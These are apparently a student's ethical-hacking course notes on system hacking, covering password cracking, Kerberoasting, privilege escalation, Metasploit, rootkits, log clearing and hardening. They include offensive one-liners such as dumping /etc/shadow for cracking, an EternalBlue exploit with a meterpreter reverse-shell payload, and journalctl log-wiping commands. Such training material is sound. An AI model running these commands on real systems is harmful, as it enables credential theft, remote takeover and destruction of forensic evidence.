# System Hacking â€” Detailed Notes ðŸ”§

**Objective:** System hacking is the methodology used to compromise individual machines on a network. It focuses on methodical exploitation (not just "breaking in"); the goal is to obtain and maintain control while avoiding detection.

---

## 5 Core Goals âœ…
- **Gaining Access:** Breaching authentication or trust boundaries to obtain an initial foothold.
- **Escalating Privileges:** Moving from a low-privilege user to an administrative or root account.
- **Executing Applications:** Running code on the victim (backdoors, reverse shells, persistence agents).
- **Hiding Files / Presence:** Using rootkits, ADS, steganography and other techniques to avoid discovery.
- **Clearing Tracks:** Erasing or tampering with logs and artifacts to impede forensic investigations.

---

## Phase 1 â€” Gaining Access (Password Cracking & Initial Compromise) ðŸ”

### Password strength & entropy
- **Key idea:** Length increases search space far more than adding a single symbol set. Approximate entropy: `Entropy â‰ˆ L * log2(C)` where `C` is charset size and `L` is length.
  - Example: C=62 (a-zA-Z0-9), L=8 â†’ entropy â‰ˆ `8 * 5.95 â‰ˆ 47.6` bits. Making passwords longer increases entropy linearly by length.
- **Practical tip:** Prefer long passphrases (e.g., `thisismypasswrd`) over short complex strings.

### Attack classes & examples
- **Nonâ€‘Electronic:** Shoulder surfing (watching keyboard/screens), social engineering/phishing, dumpster diving (sticky notes, printed credentials).
- **Active Online:** Dictionary attacks, brute force, ruleâ€‘based (apply transforms to base words), malware/keyloggers, hash injection (Passâ€‘theâ€‘Hash), LLMNR/NBTâ€‘NS poisoning.
  - **USB example (lab):** deliver `PassView` on removable media with autorun configured (modern OSes often disable autorunâ€”be aware of differences in real-world settings).
- **Passive Online:** Sniffing (capture cleartext or tokens), replay attacks (capture and reâ€‘send tokens).
- **Offline:** Hash cracking with rainbow tables or GPU/CPU cracking (hashcat, John). Precomputation (rainbow tables) speeds recovery of weak hashes.

### Tools & lab commands (authorized use only)
- **Hashcat (GPU):** `hashcat -m 1000 -a 0 -o cracked.txt hashes.txt wordlist.txt`  (mode 1000 = NTLM)
- **John the Ripper:** `john --wordlist=rockyou.txt --format=NT hashes.txt`
- **Rainbow tables:** `rtgen md5 loweralpha 1 8 0 3800 33554432 0` (tune params for chains/tables)
- **Collect Linux hashes (lab):** `sudo unshadow /etc/passwd /etc/shadow > linux_hashes.txt`
- **Distributed cracking:** DNA setups use a manager to allocate cracking tasks to many clients (use only in controlled labs).

### Keyloggers & malware
- **Hardware:** inline USB devices placed between keyboard and host capture keystrokes (bypasses software-only detection).
- **Software:** userland or kernel hooks capture keystrokes and exfiltrate credentials silently.

### Windows-specific auth
- **SAM:** Stored at `%SystemRoot%/system32/config/SAM` (local password hashes).
- **NTLM:** Legacy challenge-response protocol; vulnerable to Passâ€‘theâ€‘Hash.
- **Kerberos:** Default AD protocol (KDC, TGT, TGS). **Kerberoasting**: any authenticated user can request a service ticket (TGS) for an SPN, export the encrypted ticket, and crack it offline to recover the service account password.
  - **Tools:** `Impacket` (GetUserSPNs), `PowerSploit`, `Empire`; cracking with `hashcat` (`-m 13100` for Kerberoast types) or `john`.

### LLMNR / NBTâ€‘NS poisoning
- **How:** Spoof responses to local name-resolution broadcasts and capture NTLM hashes returned by victims.
- **Tools:** `Responder`, `Inveigh`, Metasploit modules.
- **Mitigation:** Disable LLMNR and NBTâ€‘NS via Group Policy, monitor for unusual responders, and enforce DNS/name hygiene.

---

## Phase 2 â€” Privilege Escalation â¬†ï¸

### Concepts
- **Vertical:** Move from user to admin/root.
- **Horizontal:** Compromise other accounts at same privilege level.

### Typical techniques
- **DLL hijacking (Windows):** Many apps search CWD before system paths when loading DLLs. Placing a malicious DLL with the expected name into the app directory causes it to load attacker code.
- **Service misconfigurations:** Weak service file permissions or misconfigured services (writeable binaries, insecure startup) allow service replacement or abuse.
- **Credential reuse & cached creds:** Captured creds reused across systems.
- **SUID binaries (Linux):** Misconfigured SUIDs allow local privilege elevation.
- **Vulnerable drivers/kernels:** Local exploit code can escalate to kernel privileges.

### Detection & checks (defensive)
- **Windows:** enumerate services and scheduled tasks, check service binary ACLs, inspect autostart entries.
- **Linux:** find SUID binaries: `find / -perm -4000 -type f 2>/dev/null` and cross-check with GTFOBins for risky behaviors.
- **Useful commands (audit):** `whoami /priv`, `sc query`, `Get-Service`, `Get-Acl` (PowerShell) for Windows; `sudo -l`, `id`, `getcap -r /` for Linux.

---

## Phase 3 â€” Execution (Payloads & Postâ€‘Compromise Tools) ðŸ’»

### Metasploit overview
- **Modules:** `exploit`, `payload`, `auxiliary`, `nop`.
- **Payload types:** `singles` (standalone), `stagers`/`stages` (bootstrap network connection), `stageless` (single large payload).
- **Typical workflow:**
  - `use <exploit>`
  - `set RHOST <target>`
  - `set LHOST <attacker>`
  - `set PAYLOAD <payload>`
  - `exploit`
- **Example (lab):** `use exploit/windows/smb/ms17_010_eternalblue` + `set PAYLOAD windows/x64/meterpreter/reverse_tcp` + `exploit`.

### Malicious payloads & capabilities
- **Backdoors/Reverse shells:** Persistent remote access to the host.
- **Keyloggers/Spyware:** Keystrokes, screenshots, browser data extraction.
- **Data exfiltration:** Compression and covert channels (DNS, HTTPS, steganography).

---

## Phase 4 â€” Hiding (Evasion) ðŸ•µï¸â€â™‚ï¸

### Rootkits
- **Userland rootkits:** Modify user-space utilities or libraries to hide files/processes.
- **Kernel rootkits:** Hook kernel APIs to hide kernel objectsâ€”harder to detect and remove.
- **Hypervisor-level (Blue Pill):** Run OS in attacker-controlled hypervisorâ€”very stealthy.
- **Detection:** Crossâ€‘view analysis (compare OS APIs output vs raw disk/volume analysis using tools like `sleuthkit`/`fls`). Use file integrity monitoring (AIDE/Tripwire) and kernel integrity checks.

### NTFS Alternate Data Streams (ADS)
- **Concept:** NTFS allows named streams attached to files, hiding data behind a visible file.
- **Examples/Detection:** PowerShell `Get-Item -Path 'C:\path\file.txt' -Stream * -Force` and Sysinternals `streams.exe -s C:\path`.

### Steganography
- **LSB technique:** Store data in the least significant bits of pixels or samples; visually indistinguishable but carries hidden data.
- **Tools:** `steghide`, `stegsolve` (use in labs).

---

## Phase 5 â€” Clearing Tracks ðŸ§¹

### Common activities
- **Disable auditing** or tamper with logging configuration to prevent new events from being recorded.
- **Clear logs:** Windows Event Viewer logs (Application, Security, System); Linux `/var/log/*` or `journalctl --rotate && journalctl --vacuum-time=1s` in some contexts.
- **Tools used:** `CCleaner`, `MRU-Blaster`, custom scripts to delete artifacts.

### Detection points
- **Windows event ID 1102:** Audit log cleared â€” high priority alert for defenders.
- **Linux:** Sudden truncation or missing `wtmp`/`btmp` entries, unexpected time changes, or gaps in auditd logs.

---

## Countermeasures & Hardening ðŸ›¡ï¸

- **Passwords & hashing:** Use salted, slow hash functions (bcrypt/argon2) where possible; enforce long passphrases and frequent rotation policies for highâ€‘risk accounts.
- **Kerberos hardening:** Enable AES (drop RC4), ensure service account passwords are long/unique, limit service account privileges, monitor for suspicious Kerberos requests (abnormal SPN requests).
- **Network hygiene:** Disable LLMNR/NBTâ€‘NS, use DNS only, segment networks to limit lateral movement.
- **Logging & detection:** Centralize logs to an immutable SIEM with retention and alerting, watch for events like cleared logs or service/audit policy changes.
- **Integrity & scanning:** Periodically run `rkhunter`, `chkrootkit`, and integrity tools (`AIDE`, `Tripwire`) and scan for unexpected SUIDs or writable system binaries.
- **Operational security:** Enforce MFA for privileged accounts and jump boxes; restrict interactive logons using Group Policy; use least privilege for service accounts.

---

> **Note:** All offensive commands, demonstrations, and tools referenced here are for **authorized lab use only**. Never run them against systems you do not own or are not explicitly permitted to test.

---

*Notes expanded and clarified from Module 8 (System Hacking) on 2026-01-30.*